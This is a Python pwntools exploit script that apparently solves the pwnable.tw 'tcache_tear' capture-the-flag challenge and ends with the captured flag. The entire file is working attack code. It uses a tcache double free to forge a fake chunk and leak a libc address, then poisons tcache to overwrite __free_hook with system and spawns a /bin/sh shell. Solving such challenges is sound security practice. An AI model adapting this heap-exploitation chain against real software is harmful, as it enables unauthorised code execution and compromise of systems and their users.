#
#	***************************
#	* Pwning exploit template *
#	* Arthor: Cobra           *
#	***************************
#

from pwn import *
import sys

def conn():
	local = 0
	debug = 0

	for arg in sys.argv[1:]:
		if arg in ('-h', '--help'):
			print('Usage: python ' + sys.argv[0] + ' <option> ...')
			print('Option:')
			print('        -h, --help:     Show help')
			print('        -l, --local:    Running on local')
			print('        -d, --debug:    Use gdb auto attach')
			exit(0)
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		s = process('./tcache_tear_patched')
		if debug:
			gdb.attach(s, gdbscript='''
				b*0x400C54
				c
			''')
		else:
			raw_input('DEBUG')
	else:
		s = remote('chall.pwnable.tw', 10207)

	return s

s = conn()

binary = ELF('tcache_tear_patched')
libc = ELF('libc.so')

name = 0x602060
ptr = 0x602088

s.sendlineafter(b'Name:', b'')

s.sendlineafter(b'Your choice :', b'1')
s.sendlineafter(b'Size:', b'15')
s.sendlineafter(b'Data:', b'')

s.sendlineafter(b'Your choice :', b'2')

s.sendlineafter(b'Your choice :', b'2')

s.sendlineafter(b'Your choice :', b'1')
s.sendlineafter(b'Size:', b'15')
s.sendlineafter(b'Data:', p64(name))

s.sendlineafter(b'Your choice :', b'1')
s.sendlineafter(b'Size:', b'15')
s.sendlineafter(b'Data:', b'')

s.sendlineafter(b'Your choice :', b'1')
s.sendlineafter(b'Size:', b'15')

payload = p64(0) + p64(0x511) + b'A' * 0x18 + p64(name + 0x10) + b'A' * 0x4e0 + p64(0) + p64(0x21) + b'A' * 0x10 + p64(0) + p64(0x21)

s.sendlineafter(b'Data:', payload)

s.sendlineafter(b'Your choice :', b'2')

s.sendlineafter(b'Your choice :', b'3')

s.recvuntil(b'Name :')

libc.address = int.from_bytes(s.recv(0x18)[0x10:0x18], byteorder = 'little', signed = False) - 0x3ebca0

log.info('libc base: 0x%x', libc.address)

s.sendlineafter(b'Your choice :', b'1')
s.sendlineafter(b'Size:', b'32')
s.sendlineafter(b'Data:', b'')

s.sendlineafter(b'Your choice :', b'2')

s.sendlineafter(b'Your choice :', b'2')

s.sendlineafter(b'Your choice :', b'1')
s.sendlineafter(b'Size:', b'32')
s.sendlineafter(b'Data:', p64(libc.symbols['__free_hook']))

s.sendlineafter(b'Your choice :', b'1')
s.sendlineafter(b'Size:', b'32')
s.sendlineafter(b'Data:', b'')

s.sendlineafter(b'Your choice :', b'1')
s.sendlineafter(b'Size:', b'32')

s.sendlineafter(b'Data:', p64(libc.symbols['system']))

s.sendlineafter(b'Your choice :', b'1')
s.sendlineafter(b'Size:', b'48')
s.sendlineafter(b'Data:', b'/bin/sh\x00')

s.sendlineafter(b'Your choice :', b'2')

s.interactive()
#FLAG{tc4ch3_1s_34sy_f0r_y0u}
